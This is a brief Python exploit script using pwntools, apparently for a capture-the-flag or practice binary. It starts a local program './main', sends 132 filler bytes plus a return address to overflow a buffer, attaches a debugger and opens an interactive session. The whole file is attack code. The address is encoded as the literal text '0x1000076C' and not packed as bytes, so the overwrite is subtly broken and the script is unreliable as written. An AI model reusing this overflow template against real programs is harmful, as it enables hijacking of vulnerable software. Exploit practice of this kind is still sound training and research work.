from pwn import *


def run():
    p = process('./main')
    payload = b'a' * 132 + b'0x1000076C'
    print(payload)
    gdb.attach(p)
    pause()
    p.sendline(payload)
    p.interactive()

run()
